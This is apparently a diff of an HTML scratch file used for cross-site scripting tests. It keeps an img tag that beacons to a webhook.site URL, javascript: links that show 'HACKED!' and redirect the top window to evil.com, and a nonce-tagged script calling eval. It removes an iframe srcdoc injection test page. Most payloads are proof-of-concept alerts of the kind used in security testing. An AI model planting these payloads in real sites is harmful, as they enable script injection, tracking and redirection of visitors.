@@ -1,25 +1,5 @@
 <img src="https://webhook.site/8ca4af05-f64b-4e97-bae1-f33f6b8ffc4c"><a href="javascript:alert('HACKED!')">click</a>
 <a href="javascript:window.top.location='https://evil.com';">Abrir Exploit</a>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iframe Injection Test</title>
-</head>
-<body>
-    <h1>Iframe Injection Test</h1>
-    <button id="inject">Inject iframe</button>
-
-    <script>
-        document.getElementById('inject').addEventListener('click', () => {
-            let iframe = document.createElement('iframe');
-            // Usa srcdoc para esconder o domínio
-            iframe.srcdoc = `<script>alert(1)</script>`;
-            iframe.style.width = '100%';
-            iframe.style.height = '300px';
-            document.body.appendChild(iframe);
-        });
-    </script>
-</body>
-</html>
+<script nonce="CMCMGRGG">
+  eval("alert(1)");
+</script>
